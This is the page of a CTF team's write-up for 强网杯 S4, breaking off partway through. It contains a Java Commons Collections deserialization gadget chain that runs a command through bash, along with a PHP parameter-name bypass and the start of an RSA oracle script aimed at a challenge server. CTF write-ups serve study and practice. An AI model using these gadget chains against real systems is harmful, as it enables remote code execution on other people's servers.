<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>强网杯 S4 SU Write-Up -</title><meta name=description content="本次强网杯比赛我们 SU 取得了线上赛 12th 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com
以下是我们 SU 本次 强网杯 S4 的 writeup"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/qwb-s4-su-wu\/","name":"强网杯 s4 su write up"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"强网杯 S4 SU Write-Up","description":"本次强网杯比赛我们 SU 取得了线上赛 12th 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com\n以下是我们 SU 本次 强网杯 S4 的 writeup\n","inLanguage":"en","wordCount":6443,"datePublished":"2020-08-24T21:00:00\u002b00:00","dateModified":"2020-08-24T21:00:00\u002b00:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["QWB"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/qwb-s4-su-wu\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="强网杯 S4 SU Write-Up"><meta property="og:description" content="本次强网杯比赛我们 SU 取得了线上赛 12th 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com
以下是我们 SU 本次 强网杯 S4 的 writeup"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/qwb-s4-su-wu/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="强网杯 S4 SU Write-Up"><meta name=twitter:description content="本次强网杯比赛我们 SU 取得了线上赛 12th 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com
以下是我们 SU 本次 强网杯 S4 的 writeup"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href=https://su-team.cn/css/codeblock.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><style>.navbar-custom .avatar-container{width:58px;height:58px;margin-top:-29px;left:50%;transform:translateX(-50%);display:flex;align-items:center;justify-content:center;background:#fff;border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,.12)}.navbar-custom .avatar-container .avatar-img-border{width:100%;height:100%;border-radius:50%;overflow:hidden;margin:0;box-shadow:none}.navbar-custom .avatar-container .avatar-img{width:100%;height:100%;object-fit:cover;border-radius:50%}@media only screen and (min-width:768px){.navbar-custom .avatar-container{width:72px;height:72px;margin-top:-36px}}</style></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
<span class=sr-only>Toggle navigation</span>
<span class=icon-bar></span>
<span class=icon-bar></span>
<span class=icon-bar></span>
</button>
<a class="theme-toggle mobile-theme-toggle" href=javascript:void(0) onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</a><a class=navbar-brand href=https://su-team.cn/>su-team</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Archives href=/>Archives</a></li><li class=navlinks-container><a class=navlinks-parent role=button tabindex=0>Members</a><div class=navlinks-children><a href=/active-members>Members</a>
<a href=/pioneers>Pioneers</a></div></li><li><a title=About href=/page/about/>About</a></li><li><a title=Tags href=/tags>Tags</a></li><li class=hidden-xs><a href=javascript:void(0) class=theme-toggle onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></li></ul></div></div></nav><script>(function(){const e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches;e==="dark"||!e&&t?document.body.classList.add("dark-mode"):document.body.classList.remove("dark-mode")})();function toggleTheme(){const e=document.body;e.classList.toggle("dark-mode"),e.classList.contains("dark-mode")?localStorage.setItem("theme","dark"):localStorage.setItem("theme","light")}</script><style>.theme-toggle{cursor:pointer;padding:15px;display:flex;align-items:center}.mobile-theme-toggle{float:right;padding:15px 10px;margin-top:2px}@media(min-width:768px){.mobile-theme-toggle{display:none !important}}.theme-icon-moon,.theme-icon-sun{color:#777;transition:color .3s,transform .3s}.theme-toggle:hover .theme-icon-moon,.theme-toggle:hover .theme-icon-sun{color:#333}.theme-icon-sun{display:none}.theme-icon-moon{display:block}body.dark-mode .theme-icon-sun{display:block;color:#000}body.dark-mode .theme-icon-moon{display:none}body.dark-mode{filter:none !important;background-color:#1a1a1a !important}body.dark-mode header,body.dark-mode .container,body.dark-mode footer{filter:invert(1)hue-rotate(180deg)}body.dark-mode .navbar-custom{background-color:#1a1a1a !important;border-bottom:1px solid #333}body.dark-mode .navbar-custom .container-fluid{filter:invert(1)hue-rotate(180deg)}body.dark-mode img,body.dark-mode video,body.dark-mode iframe,body.dark-mode .avatar-img,body.dark-mode .navbar-custom .avatar-container{filter:invert(1)hue-rotate(180deg)}</style><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>强网杯 S4 SU Write-Up</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on August 24, 24080
&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;31&nbsp;min
&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;6443&nbsp;words
&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><ul><li><a href=#web>Web</a><ul><li><a href=#easy_java>easy_java</a></li><li><a href=#dice2cry>dice2cry</a></li><li><a href=#half_infiltration>half_infiltration</a></li></ul></li><li><a href=#pwn>Pwn</a><ul><li><a href=#qwblogin>qwblogin</a></li><li><a href=#direct>direct</a></li><li><a href=#easypwn>easypwn</a></li><li><a href=#oldschool>oldschool</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#miscstudy>miscstudy</a></li></ul></li><li><a href=#rev>Rev</a><ul><li><a href=#xx_warmup_obf>xx_warmup_obf</a></li><li><a href=#imitation_game>imitation_game</a></li></ul></li><li><a href=#crypto>Crypto</a><ul><li><a href=#fault>fault</a></li><li><a href=#modestudy>modestudy</a></li></ul></li><li><a href=#blockchain>Blockchain</a><ul><li><a href=#ipfs>IPFS</a></li></ul></li><li><a href=#强网先锋>强网先锋</a><ul><li><a href=#主动>主动</a></li><li><a href=#upload>upload</a></li><li><a href=#funhash>Funhash</a></li><li><a href=#web辅助>web辅助</a></li><li><a href=#侧防>侧防</a></li><li><a href=#baby_crt>baby_crt</a></li><li><a href=#babymessage>babymessage</a></li><li><a href=#bank>bank</a></li><li><a href=#红方辅助>红方辅助</a></li><li><a href=#siri---强网先锋>Siri - 强网先锋</a></li><li><a href=#just-a-galgame---强网先锋>Just a Galgame - 强网先锋</a></li><li><a href=#babynotes---强网先锋>babynotes - 强网先锋</a></li></ul></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>本次强网杯比赛我们 SU 取得了线上赛 12th 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href=mailto:suers_xctf@126.com>suers_xctf@126.com</a></p><p>以下是我们 SU 本次 强网杯 S4 的 writeup</p><h2 id=web>Web</h2><h3 id=easy_java>easy_java</h3><p>绕一下过滤就行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>package</span> <span class=n>ysoserial</span><span class=o>.</span><span class=n>payloads</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>org</span><span class=o>.</span><span class=n>apache</span><span class=o>.</span><span class=n>commons</span><span class=o>.</span><span class=n>collections</span><span class=o>.</span><span class=n>Transformer</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>org</span><span class=o>.</span><span class=n>apache</span><span class=o>.</span><span class=n>commons</span><span class=o>.</span><span class=n>collections</span><span class=o>.</span><span class=n>bag</span><span class=o>.</span><span class=n>AbstractMapBag</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>org</span><span class=o>.</span><span class=n>apache</span><span class=o>.</span><span class=n>commons</span><span class=o>.</span><span class=n>collections</span><span class=o>.</span><span class=n>bag</span><span class=o>.</span><span class=n>HashBag</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>org</span><span class=o>.</span><span class=n>apache</span><span class=o>.</span><span class=n>commons</span><span class=o>.</span><span class=n>collections</span><span class=o>.</span><span class=n>functors</span><span class=o>.</span><span class=n>ChainedTransformer</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>org</span><span class=o>.</span><span class=n>apache</span><span class=o>.</span><span class=n>commons</span><span class=o>.</span><span class=n>collections</span><span class=o>.</span><span class=n>functors</span><span class=o>.</span><span class=n>ConstantTransformer</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>org</span><span class=o>.</span><span class=n>apache</span><span class=o>.</span><span class=n>commons</span><span class=o>.</span><span class=n>collections</span><span class=o>.</span><span class=n>functors</span><span class=o>.</span><span class=n>InvokerTransformer</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>org</span><span class=o>.</span><span class=n>apache</span><span class=o>.</span><span class=n>commons</span><span class=o>.</span><span class=n>collections</span><span class=o>.</span><span class=n>keyvalue</span><span class=o>.</span><span class=n>TiedMapEntry</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>org</span><span class=o>.</span><span class=n>apache</span><span class=o>.</span><span class=n>commons</span><span class=o>.</span><span class=n>collections</span><span class=o>.</span><span class=n>map</span><span class=o>.</span><span class=n>LazyMap</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>java</span><span class=o>.</span><span class=n>io</span><span class=o>.</span><span class=n>FileOutputStream</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>java</span><span class=o>.</span><span class=n>io</span><span class=o>.</span><span class=n>ObjectOutputStream</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>java</span><span class=o>.</span><span class=n>lang</span><span class=o>.</span><span class=n>reflect</span><span class=o>.</span><span class=n>Field</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>java</span><span class=o>.</span><span class=n>util</span><span class=o>.</span><span class=n>HashMap</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>java</span><span class=o>.</span><span class=n>util</span><span class=o>.</span><span class=n>IdentityHashMap</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>java</span><span class=o>.</span><span class=n>util</span><span class=o>.</span><span class=n>Map</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>public</span> <span class=k>class</span> <span class=n>Test</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>public</span> <span class=k>static</span> <span class=n>void</span> <span class=n>main</span><span class=p>(</span><span class=ne>String</span><span class=p>[]</span> <span class=n>args</span><span class=p>)</span> <span class=n>throws</span> <span class=n>Exception</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>Transformer</span><span class=p>[]</span> <span class=n>fake</span> <span class=o>=</span> <span class=n>new</span> <span class=n>Transformer</span><span class=p>[]{</span>
</span></span><span class=line><span class=cl>            <span class=n>new</span> <span class=n>ConstantTransformer</span><span class=p>(</span><span class=s2>&#34;placeholder&#34;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>Transformer</span><span class=p>[]</span> <span class=n>transformers</span> <span class=o>=</span> <span class=n>new</span> <span class=n>Transformer</span><span class=p>[]{</span>
</span></span><span class=line><span class=cl>            <span class=n>new</span> <span class=n>ConstantTransformer</span><span class=p>(</span><span class=n>Class</span><span class=o>.</span><span class=k>class</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=n>new</span> <span class=n>InvokerTransformer</span><span class=p>(</span><span class=s2>&#34;getMethod&#34;</span><span class=p>,</span> <span class=n>new</span> <span class=n>Class</span><span class=p>[]{</span><span class=ne>String</span><span class=o>.</span><span class=k>class</span><span class=p>,</span> <span class=n>Class</span><span class=p>[]</span><span class=o>.</span><span class=k>class</span><span class=p>},</span> <span class=n>new</span> <span class=ne>Object</span><span class=p>[]{</span><span class=s2>&#34;forName&#34;</span><span class=p>,</span>  <span class=n>new</span> <span class=n>Class</span><span class=p>[]{</span><span class=ne>String</span><span class=o>.</span><span class=k>class</span><span class=p>}}),</span>
</span></span><span class=line><span class=cl>            <span class=n>new</span> <span class=n>InvokerTransformer</span><span class=p>(</span><span class=s2>&#34;invoke&#34;</span><span class=p>,</span> <span class=n>new</span> <span class=n>Class</span><span class=p>[]{</span><span class=ne>Object</span><span class=o>.</span><span class=k>class</span><span class=p>,</span> <span class=ne>Object</span><span class=p>[]</span><span class=o>.</span><span class=k>class</span><span class=p>},</span> <span class=n>new</span> <span class=ne>Object</span><span class=p>[]{</span><span class=n>null</span><span class=p>,</span> <span class=n>new</span> <span class=ne>Object</span><span class=p>[]{</span><span class=s2>&#34;java.lang.Runtime&#34;</span><span class=p>}}),</span>
</span></span><span class=line><span class=cl>            <span class=n>new</span> <span class=n>InvokerTransformer</span><span class=p>(</span><span class=s2>&#34;getMethod&#34;</span><span class=p>,</span> <span class=n>new</span> <span class=n>Class</span><span class=p>[]{</span><span class=ne>String</span><span class=o>.</span><span class=k>class</span><span class=p>,</span> <span class=n>Class</span><span class=p>[]</span><span class=o>.</span><span class=k>class</span><span class=p>},</span> <span class=n>new</span> <span class=ne>Object</span><span class=p>[]{</span><span class=s2>&#34;getRuntime&#34;</span><span class=p>,</span> <span class=n>new</span> <span class=n>Class</span><span class=p>[]{}}),</span>
</span></span><span class=line><span class=cl>            <span class=n>new</span> <span class=n>InvokerTransformer</span><span class=p>(</span><span class=s2>&#34;invoke&#34;</span><span class=p>,</span> <span class=n>new</span> <span class=n>Class</span><span class=p>[]{</span><span class=ne>Object</span><span class=o>.</span><span class=k>class</span><span class=p>,</span> <span class=ne>Object</span><span class=p>[]</span><span class=o>.</span><span class=k>class</span><span class=p>},</span> <span class=n>new</span> <span class=ne>Object</span><span class=p>[]{</span><span class=n>null</span><span class=p>,</span> <span class=n>new</span> <span class=ne>Object</span><span class=p>[]{}}),</span>
</span></span><span class=line><span class=cl>            <span class=n>new</span> <span class=n>InvokerTransformer</span><span class=p>(</span><span class=s2>&#34;exec&#34;</span><span class=p>,</span> <span class=n>new</span> <span class=n>Class</span><span class=p>[]{</span><span class=ne>String</span><span class=p>[]</span><span class=o>.</span><span class=k>class</span><span class=p>},</span> <span class=n>new</span> <span class=ne>Object</span><span class=p>[]{</span><span class=n>new</span> <span class=ne>String</span><span class=p>[]{</span><span class=s2>&#34;bash&#34;</span><span class=p>,</span> <span class=s2>&#34;-c&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>}}),</span>
</span></span><span class=line><span class=cl>        <span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>ChainedTransformer</span> <span class=n>chainedTransformer</span> <span class=o>=</span> <span class=n>new</span> <span class=n>ChainedTransformer</span><span class=p>(</span><span class=n>fake</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>IdentityHashMap</span> <span class=n>identityHashMap</span> <span class=o>=</span> <span class=n>new</span> <span class=n>IdentityHashMap</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=n>LazyMap</span> <span class=n>lazyMap</span> <span class=o>=</span> <span class=p>(</span><span class=n>LazyMap</span><span class=p>)</span> <span class=n>LazyMap</span><span class=o>.</span><span class=n>decorate</span><span class=p>(</span><span class=n>identityHashMap</span><span class=p>,</span> <span class=n>chainedTransformer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>TiedMapEntry</span> <span class=n>tiedMapEntry</span> <span class=o>=</span> <span class=n>new</span> <span class=n>TiedMapEntry</span><span class=p>(</span><span class=n>lazyMap</span><span class=p>,</span> <span class=s2>&#34;placeholder&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>HashBag</span> <span class=n>hashMap</span> <span class=o>=</span> <span class=n>new</span> <span class=n>HashBag</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=n>hashMap</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>tiedMapEntry</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>Field</span> <span class=n>field</span> <span class=o>=</span> <span class=n>chainedTransformer</span><span class=o>.</span><span class=n>getClass</span><span class=p>()</span><span class=o>.</span><span class=n>getDeclaredField</span><span class=p>(</span><span class=s2>&#34;iTransformers&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>field</span><span class=o>.</span><span class=n>setAccessible</span><span class=p>(</span><span class=bp>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>field</span><span class=o>.</span><span class=n>set</span><span class=p>(</span><span class=n>chainedTransformer</span><span class=p>,</span> <span class=n>transformers</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>identityHashMap</span><span class=o>.</span><span class=n>clear</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>ObjectOutputStream</span> <span class=n>oos</span> <span class=o>=</span> <span class=n>new</span> <span class=n>ObjectOutputStream</span><span class=p>(</span><span class=n>new</span> <span class=n>FileOutputStream</span><span class=p>(</span><span class=s2>&#34;out.bin&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=n>oos</span><span class=o>.</span><span class=n>writeObject</span><span class=p>(</span><span class=n>hashMap</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=dice2cry>dice2cry</h3><p>http://106.14.66.189/abi.php.bak 得到源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>session_start();
</span></span><span class=line><span class=cl>header(&#34;Content-type:text/html;charset=utf-8&#34;);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        $data = json_decode($json_string, true);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        $rand_number = isset($_POST[&#39;this_is.able&#39;]) ? $_POST[&#39;this_is.able&#39;] : mt_rand();
</span></span><span class=line><span class=cl>        $n = gmp_init($data[&#39;n&#39;]);
</span></span><span class=line><span class=cl>        $d = gmp_init($data[&#39;d&#39;]);
</span></span><span class=line><span class=cl>        $c = gmp_init($rand_number);
</span></span><span class=line><span class=cl>        $m = gmp_powm($c,$d,$n);
</span></span><span class=line><span class=cl>        $v3 = gmp_init(&#39;3&#39;);
</span></span><span class=line><span class=cl>        $r = gmp_mod($m,$v3);
</span></span><span class=line><span class=cl>        $result=(int)gmp_strval($r);
</span></span><span class=line><span class=cl>        $dice = array(&#34;num&#34;=&gt;$result);
</span></span><span class=line><span class=cl>        $json_obj = json_encode($dice);
</span></span><span class=line><span class=cl>        echo $json_obj;
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p>可以看到 <a href=https://github.com/php/php-src/commit/fc4d462e947828fdbeac6020ac8f34704a218834>https://github.com/php/php-src/commit/fc4d462e947828fdbeac6020ac8f34704a218834</a> 这次 commit 修了一个bug，我们可以用<code>[</code>绕过 php 对点的转换。web 部分结束
密码学部分：RSA LSB Oracle，不过是mod 3的。把区间改一改就行了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>long_to_bytes</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cookies</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;PHPSESSID&#34;</span><span class=p>:</span> <span class=s2>&#34;4fp96q7ik9osjbvuaignpiv70o&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;encrypto_flag&#34;</span><span class=p>:</span> <span class=s2>&#34;3869312711921718181496939729558807189471208864005174371688083330158692727951530885631463620813499380620505887128241566855245089238486494716206458945983582420081939159954313437949593882767853854572863428430644724509166235841551934917025078319846503154318123173991091238707586128668756962224602429656368938289&#34;</span><span class=p>,</span>
